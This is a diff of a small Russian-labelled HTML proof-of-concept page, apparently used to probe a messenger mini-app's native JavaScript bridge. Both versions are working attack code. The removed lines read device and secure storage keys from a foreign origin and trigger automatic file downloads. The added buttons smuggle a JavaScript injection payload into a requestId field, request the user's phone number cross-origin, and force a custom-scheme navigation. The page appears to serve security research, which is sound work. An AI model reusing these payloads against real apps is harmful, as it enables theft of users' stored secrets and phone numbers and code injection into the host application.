@@ -1,36 +1,23 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE html>
 <html xmlns="http://www.w3.org/1999/xhtml" lang="ru">
-<head><meta charset="utf-8"/><title>RESULT</title>
-<style>
-body{font:16px monospace;margin:10px;background:#fffbe6}
-#big{font-size:20px;font-weight:bold;background:#fff;border:3px solid #484;border-radius:8px;padding:14px;margin-top:8px;word-break:break-all}
-#s{margin-top:8px;word-break:break-all;color:#555}
-</style></head>
+<head><meta charset="utf-8"/><title>F</title>
+<style>body{font:14px monospace;margin:8px;background:#fffbe6}button{width:100%;padding:12px;font:inherit;font-size:15px;font-weight:bold;border-radius:8px;cursor:pointer;margin:4px 0;border:2px solid #484;background:#dfd}
+#s{word-break:break-all;color:#555}</style></head>
 <body>
-<div>Это ЧУЖОЙ сайт (cdn.jsdelivr.net). Сейчас он сам прочитает хранилище мини-приложения…</div>
-<div id="big">ожидание…</div>
-<div id="s">-</div>
+<button id="i">1 INJ — инъекция в главную страницу</button>
+<button id="p">2 PHONE — запрос телефона с чужого origin</button>
+<button id="m">3 MAX — переход max://max.ru/support</button>
+<div id="s">готов</div>
 <script><![CDATA[
-const big=document.getElementById('big');
 const s=document.getElementById('s');
 const TS=Date.now().toString(36);
-window.WebApp={sendEvent:function(n,d){
-  const line=document.createElement('div'); line.textContent="<= "+n+" "+d; s.appendChild(line);
-  if(String(d).indexOf("SECRET-SHARED-VALUE")>=0){ big.textContent="ПРОЧИТАНО С ЧУЖОГО САЙТА: "+d; big.style.borderColor="#c00"; }
-}};
-function post(name,obj){
-  try{ window.webkit.messageHandlers.EventHandler.postMessage(name+":"+JSON.stringify(obj)); }
-  catch(e){ big.textContent="мост недоступен: "+e.message; }
-}
-setTimeout(function(){post("WebAppDeviceStorageGetKey",{requestId:"xread-"+TS,key:"probe-secret-shared"})},1200);
-setTimeout(function(){post("WebAppDownloadFile",{url:"https://nbafan00.github.io/dl-check/probe.txt",file_name:"probe-auto1s-"+TS+".txt"})},1000);
-setTimeout(function(){post("WebAppDownloadFile",{url:"https://nbafan00.github.io/dl-check/probe.txt",file_name:"probe-auto5s-"+TS+".txt"})},5000);
-const rb=document.createElement('button');
-rb.textContent="ПРОЧИТАТЬ ХРАНИЛИЩЕ ЕЩЁ РАЗ";
-rb.style.cssText="width:100%;padding:14px;font:inherit;font-size:16px;font-weight:bold;background:#dfd;border:2px solid #484;border-radius:8px;cursor:pointer;margin-top:8px";
-rb.onclick=function(){post("WebAppDeviceStorageGetKey",{requestId:"xread2-"+TS,key:"probe-secret-shared"});
-  setTimeout(function(){post("WebAppSecureStorageGetKey",{requestId:"xsec2-"+TS,key:"probe-secret-sec"})},400);};
-document.body.appendChild(rb);
+window.WebApp={sendEvent:function(n,d){s.textContent="<= "+n+" "+d;}};
+function post(name,obj){ try{ window.webkit.messageHandlers.EventHandler.postMessage(name+":"+JSON.stringify(obj)); s.textContent="отправлено: "+name; }catch(e){ s.textContent="нет моста: "+e.message; } }
+document.getElementById('i').onclick=function(){
+  post("WebAppDeviceStorageGetKey",{requestId:');document.title="PWNED-BY-IFRAME";window.__fromIframe=1;//',key:"k"+TS});
+};
+document.getElementById('p').onclick=function(){ post("WebAppRequestPhone",{}); };
+document.getElementById('m').onclick=function(){ s.textContent="навигация max://support…"; location.href="max://max.ru/support"; };
 ]]></script>
 </body></html>
